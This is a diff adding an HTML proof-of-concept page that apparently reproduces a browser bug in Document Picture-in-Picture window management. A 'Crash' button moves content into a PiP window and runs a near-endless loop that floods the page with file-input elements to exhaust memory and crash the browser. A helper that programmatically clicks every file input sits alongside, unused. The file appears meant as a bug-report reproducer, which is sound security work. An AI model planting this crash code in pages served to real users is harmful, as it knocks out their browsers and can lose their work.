@@ -1,0 +1,66 @@
+<html>
+<body>
+Parent Window: <input type="file"></input>
+</br></br>
+<div id="frame1"><p>Vulnerability in Window Management</p> 
+<button id="pip">PIP</button>
+<button id="crash" onclick="new function b(){  
+      const inputContainer = document.getElementById('frame1');	  
+	  for (let i = 0; i < 9000000000000000000000000000000000; i++) {
+        const br = document.createElement('br'); 
+        const br1 = document.createElement('br');
+        const div = document.createElement('span');
+        const fileInput = document.createElement('input');
+        fileInput.type = 'file';
+        div.innerHTML = 'PIP File Input'
+        inputContainer.appendChild(br);
+        inputContainer.appendChild(br);
+        inputContainer.appendChild(div);
+        inputContainer.appendChild(fileInput);
+
+      }
+}">Crash (Click Inside PIP Window Only)</button>
+</div>
+
+<script>
+function createFileInputs(count) {
+      const inputContainer = document.getElementById('frame1');
+      
+      for (let i = 0; i < count; i++) {
+        const br = document.createElement('br'); 
+        const br1 = document.createElement('br');
+        const div = document.createElement('span');
+        const fileInput = document.createElement('input');
+        fileInput.type = 'file';
+        div.innerHTML = 'PIP File Input'
+        inputContainer.appendChild(br);
+        inputContainer.appendChild(br);
+        inputContainer.appendChild(div);
+        inputContainer.appendChild(fileInput);
+
+      }
+}
+function triggerFileSelection() {
+      const fileInputs = document.querySelectorAll('input[type="file"]');
+      
+      fileInputs.forEach(input => {
+        input.click(); // Programmatically trigger the file selection dialog
+      });
+}
+
+pipButton = document.getElementById("pip");
+pipButton.addEventListener('click', async () => {
+  console.log("clicked");
+
+  const player = document.querySelector("#frame1");
+  // Open a Picture-in-Picture window.
+  const pipWindow = await documentPictureInPicture.requestWindow();
+
+  // Move the player to the Picture-in-Picture window.
+  pipWindow.document.body.append(player);
+  
+  //triggerFileSelection();
+});
+</script>
+</body>
+</html>
